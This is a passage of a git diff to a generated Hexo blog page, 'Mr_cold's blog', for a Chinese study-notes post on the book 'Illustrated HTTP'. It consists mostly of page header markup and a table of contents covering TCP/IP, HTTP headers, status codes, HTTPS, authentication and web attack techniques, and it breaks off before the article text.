@@ -21,7 +21,7 @@ TCP/IP协议族，分为4层
 
 
 .."><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Mr_cold's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">图解HTTP</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E4%BA%86%E8%A7%A3web%E5%8F%8A%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80"><span class="toc-text">第一章 了解Web及网络基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-tcp/ip"><span class="toc-text">1 TCP&#x2F;IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%B8%8E-http-%E5%85%B3%E7%B3%BB%E5%AF%86%E5%88%87%E7%9A%84%E5%8D%8F%E8%AE%AE%EF%BC%9Aip%E3%80%81tcp-%E5%92%8C-dns"><span class="toc-text">2 与 HTTP 关系密切的协议：IP、TCP 和 DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-uri%E5%92%8Curl"><span class="toc-text">3 URI和URL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-rfc%EF%BC%88request-for-comments%EF%BC%8C%E5%BE%81%E6%B1%82%E4%BF%AE%E6%AD%A3%E6%84%8F%E8%A7%81%E4%B9%A6%EF%BC%89"><span class="toc-text">4 RFC（Request for Comments，征求修正意见书）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%AE%80%E5%8D%95%E7%9A%84http%E5%8D%8F%E8%AE%AE"><span class="toc-text">第二章 简单的HTTP协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%AB%A0-http%E6%8A%A5%E6%96%87%E5%86%85%E7%9A%84http%E4%BF%A1%E6%81%AF"><span class="toc-text">第三章 HTTP报文内的HTTP信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%8A%A5%E6%96%87%E7%BB%93%E6%9E%84"><span class="toc-text">1 报文结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%BC%96%E7%A0%81%E6%8F%90%E5%8D%87%E4%BC%A0%E8%BE%93%E6%95%88%E7%8E%87"><span class="toc-text">2 编码提升传输效率</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8F%91%E9%80%81%E5%A4%9A%E7%A7%8D%E6%95%B0%E6%8D%AE%E7%9A%84%E5%A4%9A%E9%83%A8%E5%88%86%E5%AF%B9%E8%B1%A1%E9%9B%86%E5%90%88"><span class="toc-text">3 发送多种数据的多部分对象集合</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%8E%B7%E5%8F%96%E9%83%A8%E5%88%86%E5%86%85%E5%AE%B9%E7%9A%84%E8%8C%83%E5%9B%B4%E8%AF%B7%E6%B1%82"><span class="toc-text">4 获取部分内容的范围请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%86%85%E5%AE%B9%E5%8D%8F%E5%95%86%E8%BF%94%E5%9B%9E%E6%9C%80%E5%90%88%E9%80%82%E7%9A%84%E5%86%85%E5%AE%B9"><span class="toc-text">5 内容协商返回最合适的内容</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E7%9A%84http%E7%8A%B6%E6%80%81%E7%A0%81"><span class="toc-text">第四章 返回结果的HTTP状态码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2xx%E6%88%90%E5%8A%9F"><span class="toc-text">1 2XX成功</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3xx%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-text">2 3XX重定向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4xx%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%94%99%E8%AF%AF"><span class="toc-text">3 4XX客户端错误</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5xx%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%94%99%E8%AF%AF"><span class="toc-text">4 5XX服务器错误</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%AB%A0-%E4%B8%8Ehttp%E5%8D%8F%E4%BD%9C%E7%9A%84web%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-text">第五章 与HTTP协作的Web服务器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%94%A8%E5%8D%95%E5%8F%B0%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E5%AE%9E%E7%8E%B0%E5%A4%9A%E4%B8%AA%E5%9F%9F%E5%90%8D"><span class="toc-text">1 用单台虚拟主机实现多个域名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%80%9A%E4%BF%A1%E6%95%B0%E6%8D%AE%E8%BD%AC%E5%8F%91%E7%A8%8B%E5%BA%8F%EF%BC%9A%E4%BB%A3%E7%90%86%EF%BC%8C%E7%BD%91%E5%85%B3%EF%BC%8C%E9%9A%A7%E9%81%93"><span class="toc-text">2 通信数据转发程序：代理，网关，隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%90%86"><span class="toc-text">代理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E5%85%B3"><span class="toc-text">网关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9A%A7%E9%81%93"><span class="toc-text">隧道</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%BF%9D%E5%AD%98%E8%B5%84%E6%BA%90%E7%9A%84%E7%BC%93%E5%AD%98"><span class="toc-text">3 保存资源的缓存</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%93%E5%AD%98%E7%9A%84%E6%9C%89%E6%95%88%E6%9C%9F%E9%99%90"><span class="toc-text">缓存的有效期限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E7%BC%93%E5%AD%98"><span class="toc-text">客户端的缓存</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E7%AB%A0-http%E9%A6%96%E9%83%A8"><span class="toc-text">第六章 HTTP首部</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-http%E6%8A%A5%E6%96%87%E9%A6%96%E9%83%A8"><span class="toc-text">1 HTTP报文首部</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-http%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5"><span class="toc-text">2 HTTP首部字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-http/1.1-%E9%80%9A%E7%94%A8%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5"><span class="toc-text">3 HTTP&#x2F;1.1 通用首部字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%AF%B7%E6%B1%82%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5"><span class="toc-text">4 请求首部字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%93%8D%E5%BA%94%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5"><span class="toc-text">5 响应首部字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%AE%9E%E4%BD%93%E9%A6%96%E9%83%A8%E5%AD%97"><span class="toc-text">6 实体首部字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E4%B8%BAcookie%E6%9C%8D%E5%8A%A1%E7%9A%84%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5"><span class="toc-text">7 为Cookie服务的首部字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E5%85%B6%E4%BB%96%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5"><span class="toc-text">8 其他首部字段</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E7%AB%A0-%E7%A1%AE%E4%BF%9Dweb%E5%AE%89%E5%85%A8%E7%9A%84https"><span class="toc-text">第七章 确保Web安全的HTTPS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7.1-http%E7%9A%84%E7%BC%BA%E7%82%B9"><span class="toc-text">7.1 HTTP的缺点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#7.1.1-%E9%80%9A%E4%BF%A1%E4%BD%BF%E7%94%A8%E6%98%8E%E6%96%87%E5%8F%AF%E8%83%BD%E4%BC%9A%E8%A2%AB%E7%AA%83%E5%90%AC"><span class="toc-text">7.1.1 通信使用明文可能会被窃听</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7.1.2-%E4%B8%8D%E9%AA%8C%E8%AF%81%E9%80%9A%E4%BF%A1%E6%96%B9%E7%9A%84%E8%BA%AB%E4%BB%BD%E5%B0%B1%E5%8F%AF%E8%83%BD%E9%81%AD%E5%8F%97%E4%BC%AA%E8%A3%85"><span class="toc-text">7.1.2 不验证通信方的身份就可能遭受伪装</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7.1.3-%E6%97%A0%E6%B3%95%E8%AF%81%E6%98%8E%E6%8A%A5%E6%96%87%E7%9A%84%E5%AE%8C%E6%95%B4%E6%80%A7%EF%BC%8C%E5%8F%AF%E8%83%BD%E5%B7%B2%E9%81%AD%E7%AF%A1%E6%94%B9"><span class="toc-text">7.1.3 无法证明报文的完整性，可能已遭篡改</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7.2-http+%E5%8A%A0%E5%AF%86+%E8%AE%A4%E8%AF%81+%E5%AE%8C%E6%95%B4%E6%80%A7%E4%BF%9D%E6%8A%A4=https"><span class="toc-text">7.2 HTTP+加密+认证+完整性保护&#x3D;HTTPS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#7.2.2-https%E6%98%AF%E8%BA%AB%E6%8A%ABssl%E5%A4%96%E5%A3%B3%E7%9A%84http"><span class="toc-text">7.2.2 HTTPS是身披SSL外壳的HTTP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7.2.3-%E7%9B%B8%E4%BA%92%E4%BA%A4%E4%BA%92%E5%AF%86%E9%92%A5%E7%9A%84%E5%85%AC%E5%BC%80%E5%AF%86%E9%92%A5%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF"><span class="toc-text">7.2.3 相互交互密钥的公开密钥加密技术</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7.2.4-%E8%AF%81%E6%98%8E%E5%85%AC%E5%BC%80%E5%AF%86%E9%92%A5%E6%AD%A3%E7%A1%AE%E7%9A%84%E8%AF%81%E4%B9%A6"><span class="toc-text">7.2.4 证明公开密钥正确的证书</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7.2.5-https-%E7%9A%84%E5%AE%89%E5%85%A8%E9%80%9A%E4%BF%A1%E6%9C%BA%E5%88%B6"><span class="toc-text">7.2.5 HTTPS 的安全通信机制</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%85%AB%E7%AB%A0-%E7%A1%AE%E8%AE%A4%E8%AE%BF%E9%97%AE%E7%94%A8%E6%88%B7%E5%9C%B0%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81"><span class="toc-text">第八章 确认访问用户地身份认证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8.1-%E4%BD%95%E4%B8%BA%E8%AE%A4%E8%AF%81"><span class="toc-text">8.1 何为认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8.2-basic%E8%AE%A4%E8%AF%81"><span class="toc-text">8.2 BASIC认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8.3-digest%E8%AE%A4%E8%AF%81"><span class="toc-text">8.3 DIGEST认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8.4-ssl%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%A4%E8%AF%81"><span class="toc-text">8.4 SSL客户端认证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#8.4.1-ssl-%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%A4%E8%AF%81%E7%9A%84%E8%AE%A4%E8%AF%81%E6%AD%A5%E9%AA%A4"><span class="toc-text">8.4.1 SSL 客户端认证的认证步骤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8.4.2-ssl-%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%A4%E8%AF%81%E9%87%87%E7%94%A8%E5%8F%8C%E5%9B%A0%E7%B4%A0%E8%AE%A4%E8%AF%81"><span class="toc-text">8.4.2　SSL 客户端认证采用双因素认证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ssl-%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%A4%E8%AF%81%E5%BF%85%E8%A6%81%E7%9A%84%E8%B4%B9%E7%94%A8"><span class="toc-text">SSL 客户端认证必要的费用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8.5-%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E8%AE%A4%E8%AF%81"><span class="toc-text">8.5 基于表单认证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#8.5.1-%E8%AE%A4%E8%AF%81%E5%A4%9A%E5%8D%8A%E4%B8%BA%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E8%AE%A4%E8%AF%81"><span class="toc-text">8.5.1　认证多半为基于表单认证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8.5.2-session-%E7%AE%A1%E7%90%86%E5%8F%8A-cookie-%E5%BA%94%E7%94%A8"><span class="toc-text">8.5.2　Session 管理及 Cookie 应用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E5%9F%BA%E4%BA%8Ehttp%E7%9A%84%E5%8A%9F%E8%83%BD%E8%BF%BD%E5%8A%A0%E5%8D%8F%E8%AE%AE"><span class="toc-text">第九章 基于HTTP的功能追加协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#9.1-%E5%9F%BA%E4%BA%8Ehttp%E7%9A%84%E5%8D%8F%E8%AE%AE"><span class="toc-text">9.1 基于HTTP的协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9.2-%E6%B6%88%E9%99%A4http%E7%93%B6%E9%A2%88%E7%9A%84spdy"><span class="toc-text">9.2 消除HTTP瓶颈的SPDY</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#9.2.1-http%E7%9A%84%E7%93%B6%E9%A2%88"><span class="toc-text">9.2.1 HTTP的瓶颈</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9.2.2-spdy%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%8A%9F%E8%83%BD"><span class="toc-text">9.2.2 SPDY的设计和功能</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9.2.3-spdy%E6%B6%88%E9%99%A4web%E7%93%B6%E9%A2%88%E4%BA%86%E5%90%97"><span class="toc-text">9.2.3 SPDY消除Web瓶颈了吗</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9.3-%E4%BD%BF%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%9B%E8%A1%8C%E5%85%A8%E5%8F%8C%E5%B7%A5%E9%80%9A%E4%BF%A1%E7%9A%84websocket"><span class="toc-text">9.3 使用浏览器进行全双工通信的WebSocket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9.4-http/2.0"><span class="toc-text">9.4 HTTP&#x2F;2.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9.5-web%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AE%A1%E7%90%86%E6%96%87%E4%BB%B6%E7%9A%84webdav"><span class="toc-text">9.5 Web服务器管理文件的WebDAV</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E7%AB%A0-%E6%9E%84%E5%BB%BAweb%E5%86%85%E5%AE%B9%E7%9A%84%E6%8A%80%E6%9C%AF"><span class="toc-text">第十章 构建Web内容的技术</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10.1-html"><span class="toc-text">10.1 HTML</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10.2-%E5%8A%A8%E6%80%81html"><span class="toc-text">10.2 动态HTML</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10.3-web%E5%BA%94%E7%94%A8"><span class="toc-text">10.3 Web应用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10.4-%E6%95%B0%E6%8D%AE%E5%8F%91%E5%B8%83%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%92%8C%E8%AF%AD%E8%A8%80"><span class="toc-text">10.4 数据发布的格式和语言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF"><span class="toc-text">第十一章 Web的攻击技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#11.1-%E9%92%88%E5%AF%B9web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF"><span class="toc-text">11.1 针对Web的攻击技术</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E5%B8%B8%E6%94%BB%E5%87%BB%E6%A8%A1%E5%BC%8F%E5%A6%82%E4%B8%8B"><span class="toc-text">通常攻击模式如下</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/web"><i class="tag post-item-tag">web</i></a><a href="/tags/HTTP"><i class="tag post-item-tag">HTTP</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">图解HTTP</h1><time class="has-text-grey" datetime="2023-06-18T08:09:17.551Z">2023-06-18</time><article class="mt-2 post-content"><p><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/x_x.jpg" alt></p>
+</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Mr_cold's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">图解HTTP</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E4%BA%86%E8%A7%A3web%E5%8F%8A%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80"><span class="toc-text">第一章 了解Web及网络基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-tcp/ip"><span class="toc-text">1 TCP&#x2F;IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%B8%8E-http-%E5%85%B3%E7%B3%BB%E5%AF%86%E5%88%87%E7%9A%84%E5%8D%8F%E8%AE%AE%EF%BC%9Aip%E3%80%81tcp-%E5%92%8C-dns"><span class="toc-text">2 与 HTTP 关系密切的协议：IP、TCP 和 DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-uri%E5%92%8Curl"><span class="toc-text">3 URI和URL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-rfc%EF%BC%88request-for-comments%EF%BC%8C%E5%BE%81%E6%B1%82%E4%BF%AE%E6%AD%A3%E6%84%8F%E8%A7%81%E4%B9%A6%EF%BC%89"><span class="toc-text">4 RFC（Request for Comments，征求修正意见书）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%AE%80%E5%8D%95%E7%9A%84http%E5%8D%8F%E8%AE%AE"><span class="toc-text">第二章 简单的HTTP协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%AB%A0-http%E6%8A%A5%E6%96%87%E5%86%85%E7%9A%84http%E4%BF%A1%E6%81%AF"><span class="toc-text">第三章 HTTP报文内的HTTP信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%8A%A5%E6%96%87%E7%BB%93%E6%9E%84"><span class="toc-text">1 报文结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%BC%96%E7%A0%81%E6%8F%90%E5%8D%87%E4%BC%A0%E8%BE%93%E6%95%88%E7%8E%87"><span class="toc-text">2 编码提升传输效率</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8F%91%E9%80%81%E5%A4%9A%E7%A7%8D%E6%95%B0%E6%8D%AE%E7%9A%84%E5%A4%9A%E9%83%A8%E5%88%86%E5%AF%B9%E8%B1%A1%E9%9B%86%E5%90%88"><span class="toc-text">3 发送多种数据的多部分对象集合</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%8E%B7%E5%8F%96%E9%83%A8%E5%88%86%E5%86%85%E5%AE%B9%E7%9A%84%E8%8C%83%E5%9B%B4%E8%AF%B7%E6%B1%82"><span class="toc-text">4 获取部分内容的范围请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%86%85%E5%AE%B9%E5%8D%8F%E5%95%86%E8%BF%94%E5%9B%9E%E6%9C%80%E5%90%88%E9%80%82%E7%9A%84%E5%86%85%E5%AE%B9"><span class="toc-text">5 内容协商返回最合适的内容</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E7%9A%84http%E7%8A%B6%E6%80%81%E7%A0%81"><span class="toc-text">第四章 返回结果的HTTP状态码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2xx%E6%88%90%E5%8A%9F"><span class="toc-text">1 2XX成功</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3xx%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-text">2 3XX重定向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4xx%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%94%99%E8%AF%AF"><span class="toc-text">3 4XX客户端错误</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5xx%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%94%99%E8%AF%AF"><span class="toc-text">4 5XX服务器错误</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%AB%A0-%E4%B8%8Ehttp%E5%8D%8F%E4%BD%9C%E7%9A%84web%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-text">第五章 与HTTP协作的Web服务器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%94%A8%E5%8D%95%E5%8F%B0%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E5%AE%9E%E7%8E%B0%E5%A4%9A%E4%B8%AA%E5%9F%9F%E5%90%8D"><span class="toc-text">1 用单台虚拟主机实现多个域名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%80%9A%E4%BF%A1%E6%95%B0%E6%8D%AE%E8%BD%AC%E5%8F%91%E7%A8%8B%E5%BA%8F%EF%BC%9A%E4%BB%A3%E7%90%86%EF%BC%8C%E7%BD%91%E5%85%B3%EF%BC%8C%E9%9A%A7%E9%81%93"><span class="toc-text">2 通信数据转发程序：代理，网关，隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%90%86"><span class="toc-text">代理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E5%85%B3"><span class="toc-text">网关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9A%A7%E9%81%93"><span class="toc-text">隧道</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%BF%9D%E5%AD%98%E8%B5%84%E6%BA%90%E7%9A%84%E7%BC%93%E5%AD%98"><span class="toc-text">3 保存资源的缓存</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%93%E5%AD%98%E7%9A%84%E6%9C%89%E6%95%88%E6%9C%9F%E9%99%90"><span class="toc-text">缓存的有效期限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E7%BC%93%E5%AD%98"><span class="toc-text">客户端的缓存</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E7%AB%A0-http%E9%A6%96%E9%83%A8"><span class="toc-text">第六章 HTTP首部</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-http%E6%8A%A5%E6%96%87%E9%A6%96%E9%83%A8"><span class="toc-text">1 HTTP报文首部</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-http%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5"><span class="toc-text">2 HTTP首部字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-http/1.1-%E9%80%9A%E7%94%A8%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5"><span class="toc-text">3 HTTP&#x2F;1.1 通用首部字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%AF%B7%E6%B1%82%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5"><span class="toc-text">4 请求首部字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%93%8D%E5%BA%94%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5"><span class="toc-text">5 响应首部字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%AE%9E%E4%BD%93%E9%A6%96%E9%83%A8%E5%AD%97"><span class="toc-text">6 实体首部字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E4%B8%BAcookie%E6%9C%8D%E5%8A%A1%E7%9A%84%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5"><span class="toc-text">7 为Cookie服务的首部字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E5%85%B6%E4%BB%96%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5"><span class="toc-text">8 其他首部字段</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E7%AB%A0-%E7%A1%AE%E4%BF%9Dweb%E5%AE%89%E5%85%A8%E7%9A%84https"><span class="toc-text">第七章 确保Web安全的HTTPS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7.1-http%E7%9A%84%E7%BC%BA%E7%82%B9"><span class="toc-text">7.1 HTTP的缺点</span></a><ol 